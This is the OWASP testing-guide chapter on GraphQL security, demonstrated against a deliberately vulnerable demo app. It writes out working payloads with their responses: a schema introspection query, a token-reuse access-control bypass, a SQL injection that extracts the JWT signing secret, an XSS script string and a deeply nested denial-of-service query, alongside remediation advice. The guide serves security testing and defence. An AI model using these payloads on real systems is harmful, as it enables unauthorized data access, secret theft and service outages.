# Testing GraphQL

|ID          |
|------------|
|WSTG-API-01|

## Summary

GraphQL has become very popular in modern APIs. It provides simplicity, and nested objects, which allows developers for faster development.  
Every technology, while having advantages can also expose the application to new attack surfaces.
The purpose of this guide is to provide some common misconfigurations and attack vectors on applications which utilize GraphQL.  
Some vectors are unique to GraphQL (Introspection Query for example) and some are not (SQL Injection for example).

The guide will use a demo vulnerable application which uses GraphQL for the API access in order to demonstrate vulnerable a GraphQL node.

The guide will be based on a vulnerable GraphQL application [poc-graphql](https://github.com/righettod/poc-graphql), which is run in a docker container which maps localhost:8080/GraphQL as the vulnerable GraphQL node.

## Test Objectives

Assess GraphQL's security configuration, as well as other common vulnerabilities which might affect GraphQL deployments.

## How to Test

Testing GraphQL nodes is not very different than testing other API technologies. This Guide suggests following these steps:

### Introspection Queries

A little bit of background:
"It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!"
[GraphQL.org-Introspection](https://graphql.org/learn/introspection/)
Introspection queries are the way GraphQL lets you ask it what queries it supports, which data types are available, and many more details you will need when approaching to test a GraphQL deployment. This is a good starting point on the information gathering phase.

There are a couple of ways to extract that and visualize the output:

#### Using Native GraphQL Introspection

The most straight-forward way is to send an HTTP request (using a proxy like Burp) with the following payload, taken from an article on [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696) :


```json
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

The result will usually be very long (and hence will be shorted here), and it will contain the entire scheme of the GraphQL deployment.  

Response:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "ENUM",
              "description": "Indicates this type is an enum. `enumValues` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INPUT_OBJECT",
              "description": "Indicates this type is an input object. `inputFields` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "LIST",
              "description": "Indicates this type is a list. `ofType` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "NON_NULL",
              "description": "Indicates this type is a non-null. `ofType` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

Now use GraphQL Voyager to get a better look on the output:

![GraphQL Voyager](images/Voyager.png)

This tool creates an ERD representation of the GraphQL scheme, allowing you to get a better look into the moving parts of the system you're testing.  
Extracting information from the drawing allows you to see you can query the dogs table for example. It also shows which properties a "dog" has:

* ID
* name
* veterinary (ID)  

There is one downside to using this method, GraphQL Voyager does not display everything that can be done with GraphQL, for example, in the drawing above the mutations available are not listed, so the best way would be to use both Voyager and one of the methods listed below.

#### Using the GraphiQL

GraphiQL is a web-based IDE for GraphQL. It is part of the GraphQL project, and it is mainly used for debugging or development purposes.  
The best practice is to not allow users to access it on production deployments, however, if you are testing a staging environment you might have access to it and it can save you some time playing around with introspection queries (although you can, of course, use introspection in the GraphiQL interface).  

The GraphiQL has a docs section, which uses the data from the scheme in order to created a documentation of the GraphQL instance that is being used.

The documentation contains the data types, mutations, and basically every piece of information you can extract using Introspection.

#### Using GraphQL Playgrounds

GraphQL Playgrounds is a GraphQL client, which can be used to test different queries, as well as dividing GraphQL IDEs into different playgrounds, grouped by theme or by assigning a name to them.  
Much like GraphiQL Playgrounds can create the documentation for you, without the need to manually sending introspection and processing the response but with one great advantage, it doesn't need GraphiQL interface to be available.  
Another upside for this tool, is that it works just by directing the tool to the GraphQL node via a URL (there is also the option of using it locally with the data file) and then the magic happens without any user interaction.  
Another advantage of the tool is that it can be used to test for vulnerabilities directly, you don't need to use a proxy to send HTTP requests (Burp for example), and so you can use this tool in order to manually play with GraphQL and use Burp for other, more advanced payloads.  
Note that in some cases you will need to set the HTTP headers at the bottom, to include session ID or other mechanism of authentication, but this still allows creating multiple "IDEs" with different permissions to verify if there are in fact authorization issues.

![Playgrounds1](images/Playgrounds1.png)
![Playgrounds2](images/Playgrounds2.png)

You can even download the schemes to use in Voyager.

#### Introspection Conclusion

Introspection is a useful tool which allows users to gain more information about the GraphQL deployment, however, this will also allow malicious users to gain access to the same information.  
The best practice is to limit the access to the introspection queries, since, some tools or requests might fail if this feature is disabled altogether.  
Since GraphQL is usually bridges to the backend APIs of the system, its better to enforce strict access control, which leads to the next topic.

### Authorization

The first part, referring to introspection, is the first place to look for Authorization problems. As noted, introspection should be restricted since it allows for data extraction and data gathering.  
The next thing you should check, once you have access to the scheme and know what sensitive information there is to extract, is sending queries which will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform these type of actions.  

In the example GraphQL that is being used in this guide, the output of the introspection query, shows there is a query called auth, which seems like a good place to extract sensitive information (API tokens, passwords, etc').

![auth1](images/auth1.png)

Testing the authorization implementation varies from deployment to deployment since each scheme will have different sensitive information's, and hence, different targets to focus on.  
In this example, every user (even un-authenticated) can gain access to auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the scheme allows, such as associate or disassociate a dog from any specified veterinarian (using mutations), while there is no matching of the auth token to the veterinarian which appears in the request. An example would be, to use the token that was extracted (which belongs to Julien), and use it to perform an action as Benoit, which has the number 2 ID.

```json
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

And the response:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "Banko"
        },
        {
          "name": "Banzai"
        },
        {
          "name": "Bao"
        },
        {
          "name": "Barakouda"
        },
        {
          "name": "Barba"
        },
        {
          "name": "Barbara"
        },
        {
          "name": "Bebe"
        },
        {
          "name": "Becker"
        }
      ]
    }
  }
}
```

All of the dogs in the list belong to Benoit and not to the veterinarian which sent the request (and owns the auth token).

### Injection

GraphQL is the implementation of the API layer of an application, and as such, it usually forwards the requests to a backend API or the database directly. This allows you to utilize any underlying vulnerability such as SQL injection, command injection, cross-site scripting, and basically, everything you expect to find in WEB applications, using GraphQL just changes the entry point of the malicious payload.

You can refer to other guides within the OWASP testing guide to get some ideas.

#### SQL Injection

The application is vulnerable by design in the `dogs(namePrefix: String, limit: Int = 500): [Dog!]`  since the parameter "namePrefix" is concatenated in the SQL query. Concatenating user input is a common malpractice of applications which exposes them to SQL injection.

The following query extracts information from the CONFIG table within the database:

```sql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

The response to this query is:

``` json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

The query contains the secret which signs JWTs in the example application, which is very sensitive information. Please note that in order to know what to look for you will need to collect information and learn about how the application is built as well as how the database tables are organized.  
Another thing you can do, is use tools like sqlmap to look for injection paths and even automating the extraction of data from the database.

#### Cross-Site Scripting (XSS)

Cross-Site scripting occurs when the browser treats data that should be displayed as code that should be executed, creating the opportunity to run malicious code in a user's browser.  
Reflection of input might cause XSS, but that is up to how the application is implemented, wether in encodes the output, so the best practice would be to test for XSS using a payload from [WSTG](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing).  
As noted, GraphQL only creates another layer on top of the application, so other tests from WSTG might be useful.

In this example, errors might reflect the input at times, and in case the application reflects the errors to the users, XSS might occur.

Payload:

```json
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Response:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

When it comes to injections, each vulnerability has many ways to remediate, as well as multiple security measures which should be in-place as part of the best practice, and as such will not be extensively covered in this guide.

The first line of defence when it comes to injections is input validation.  
Input validation does just that, validates the input sent to the application. GraphQL does not have a native way to validate input (except for assigning data types, but a string can contain every string without limitations), however, there is an open source project called ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) which allows for input validation as part of the scheme definition.  
For example, in the example above, the namePrefix can be limited to just containing letters, with no special characters. By blocking special characters, escaping the SQL query will not be possible and the SQL injection will not work since the query will be rejected.

Input validation alone will be good, but it will not block everything (there is no 100% security), and additional measures should be implemented as well.

**Note**: There are also scalars in GraphQL, which are usually used for custom data types which do not have native data types (DateTime for example). These types of data do not have out of the box validation as well, and you should look at them as well while testing.

### Abusive Queries

GraphQL exposes a very simple interface, to allow developers use nested queries and nested objects. This ability can also be used in a malicious way, by calling a deep nested query similar to a recursive function, causing a denial of service by using too much CPU.

In the example application, a "dog" has a reference to a veterinary which also have a reference to a dog. This allows for a deep query which will overload the application:

```json
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

There a multiple security measures which can be implemented to prevent these types of queries:

#### Timeout

GraphQL allows implementing a timeout, which kills a running query unless it concluded it's run within a specified period of time. For example, setting the timeout to 5 seconds would prevent endless running queries which use all of the application's resources and might cause it to fail.

#### Maximum Query Depth

GraphQL allows to limit the depth a query can contain. In the above example the depth of the query was 11. Depending on the scheme, a maximum depth should be set, preventing queries with a higher depth from being executed.

#### Maximum Query Complexity

Query complexity is a metric which calculates how complex the query is, just like calculating complexity in algorithms. The complexity of each field, is set by the user, allowing the user to define some fields as more complex than others. A common practice is to set each field with a complexity score of 1. However, in the following query, `allDogs` sends back a list of dogs, which might be pricier to compute, and as such the complexity should be set higher than 1. For example, if `allDogs` is set to be 5 (if, for example, it is limited to a maximum of 5 dogs) we use addition to add the 5 for `allDogs` and 1 for the ID field, giving the query a 6 complexity score.  

```json
query dos {
  allDogs(limit:5){  ##complexity 5
    id  ##complexity 1
  }
}
```

After defining complexity the application can enforce maximum query complexity, preventing too complex queries from being executed.

#### Throttling

Throttling allows to limit users usage of resources. Throttling can be implemented on 2 of the applications resources:

##### Throttling Server Time

Throttle using server time limits the amount of server time the user gets, within a specified period of time. For example, the application can allow a user 100ms of server time every second with a maximum 1000ms time. This implementation will allow the user to accumulate 1 second of server time which will take 10 seconds to accumulate, and if a malicious user tries to execute  3 queries which take 400ms each, the 3rd one will be blocked until sufficient server time is accumulated again preventing a single user to cause a denial of service.

##### Throttling Based on Query Complexity

Throttling using the query complexity will be the same as limiting using server time, the user gets a specified complexity per time unit, without the ability to exceeding it.

### Detailed Error Message

GraphQL can encounter unexpected errors during runtime. While an error like that occurs, the server sends an error specifying that, which can reveal internal error or application configuration/data/assets, allowing a malicious user to acquire more information on the application.  
In any case of errors within an application, the best practice is to send a generic string like "An error occurred" with a UID that does not reveal information to the user, and can be used by the application maintainers in order to understand what happened, and GraphQL implementations are no different.

### Exposure of Underlying API

GraphQL is a new technology, and some deployments are for transitioning from old APIs to GraphQL. In many cases, this kind of deployment is to use GraphQL as a standard API which translates requests (sent using GraphQL syntax) to an underlying API, as well as the responses. If the requests are not properly checked, the path of parameters being passed, might be changed by the user. For example, a request contains an `id=1/delete` might translate to `/api/users/1/delete`, or a manipulation of other resources of that user. Also note that the request is now sent with the authorization of the GraphQL node, which is probably on higher privileges than a common user.

The remediation for these types of vulnerabilities is both input validation and awareness of the a possible issue, since authorization problems might also occur.

## Remediation

1. Restrict access to introspection queries
2. Implement input validation
3. Implement security measures to prevent abusive queries
4. Sending generic error messages

## Tools

* [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
* [sqlmap](https://github.com/sqlmapproject/sqlmap)

### Burp GraphQL Extensions

* [InQL](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
* [GraphQL Raider](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)

### Zap Proxy Extensions

* [GraphQL addon for (OWASP) ZAP](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## References

* [poc-graphql](https://github.com/righettod/poc-graphql)
* [GraphQL Official Site](https://graphql.org/learn/)
* [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)
* [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
* [User side testing (XSS and other vulnerabilities)](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing)
* [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
* [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
